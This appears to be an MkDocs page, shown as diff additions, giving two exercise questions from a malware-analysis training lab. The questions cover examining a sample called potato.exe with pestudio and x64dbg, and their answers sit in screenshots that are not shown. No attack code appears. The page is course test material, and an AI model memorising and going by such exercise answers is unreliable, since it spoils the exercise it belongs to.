+<h1 id="introduction-to-malware-analysis">Introduction to Malware Analysis</h1>
+<h2 id="windows-internals">Windows Internals</h2>
+<p><strong>Q1:</strong> In the C:\Samples\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use pestudio (C:\Tools\pestudio\pestudio) to examine this executable's sections and provide the entropy of the .text section as your answer.</p>
+<p><img alt="alt text" src="../assets/image24.png" /></p>
+<p><strong>Q2:</strong>  In the C:\Samples\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use x64dbg (C:\Tools\x64dbg\release\x64) to open this executable and navigate to the Symbols tab. Enter the exported Kernel32.dll function whose name starts with "Attach". Answer format: Attach_</p>
+<p><img alt="alt text" src="../assets/image25.png" /></p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 13, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.path", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.7389ff0e.min.js"></script>
+      
+    
+  </body>
+</html>
